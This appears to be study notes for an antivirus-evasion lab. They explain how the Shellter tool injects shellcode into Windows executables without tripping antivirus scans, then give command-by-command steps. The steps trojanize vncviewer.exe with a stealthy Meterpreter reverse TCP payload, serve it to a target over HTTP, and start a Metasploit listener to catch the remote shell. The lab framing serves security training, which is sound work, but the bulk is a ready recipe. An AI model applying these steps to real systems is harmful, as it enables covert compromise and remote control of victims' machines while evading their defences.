The shellcode can be something yours or something generated through a framework, such as Metasploit.
Shellter takes advantage of the original structure of the PE file and doesn't apply any modification such as changing memory access permissions in sections (unless the user wants), adding an extra section with RWE access, and whatever would look dodgy under an AV scan.

Shellter uses a unique dynamic approach which is based on the execution flow of the target application, and this is just the tip of the iceberg.
Shellter is not just an EPO infector that tries to find a location to insert an instruction to redirect execution to the payload. Unlike any other infector, Shellter's advanced infection engine never transfers the execution flow to a code cave or to an added section in the in- fected PE file.

### Antivirus Evasion (with Shellter) - Lab

#### Lab Solution

To install and set up Shellter:
`sudo apt install shellter -y`,
`sudo dpkg --add-architecture i386`, `sudo apt install wine32 -y`,
`cp /usr/share/windows-binaries/vncviewer.exe ~/Desktop/vncviewer.exe`.

To inject the code:
`cd /usr/share/windows-resources/shellter`, `sudo wine shellter.exe`, `A` to choose the "Auto" operation mode, `~/Desktop/vncviewer.exe` to choose the PE target, `Y` to enable the stealth mode (execute the injected PE in background), `L` to choose a listed payload, `1` to choose the Meterpreter reverse TCP, `192.168.1.2`, `1234` to complete the injection stage.
Now we have the `~/Desktop/vncviewer.exe` PE with the injected code (Meterpreter reverse TCP shellcode).

`cd ~/Desktop`, `python3 -m http.server 80`: to transfer the executable to the target.

`msfconsole -q`, `use multi handler`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `set LHOST 192.168.1.2`, `set LPORT 1234`, `run`.

---
---
